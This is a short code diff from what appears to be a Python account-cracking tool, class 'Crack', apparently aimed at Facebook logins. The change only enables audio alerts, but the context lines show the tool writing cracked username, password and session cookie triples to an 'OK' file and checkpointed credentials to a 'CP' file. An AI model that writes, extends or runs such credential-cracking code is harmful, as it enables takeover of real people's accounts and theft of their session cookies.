@@ -518,7 +518,7 @@ class Crack:
 							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
 							prints(tree)
-							#os.popen('play-audio o.mp3')
+							os.popen('play-audio o.mp3')
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
 						break
 				elif "User must verify their account" in post.text:
@@ -530,7 +530,7 @@ class Crack:
 						tree = Tree(Panel.fit(f"""{K2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 						tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
 						prints(tree)
-						#os.popen('play-audio c.mp3')
+						os.popen('play-audio c.mp3')
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
 						break
 				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
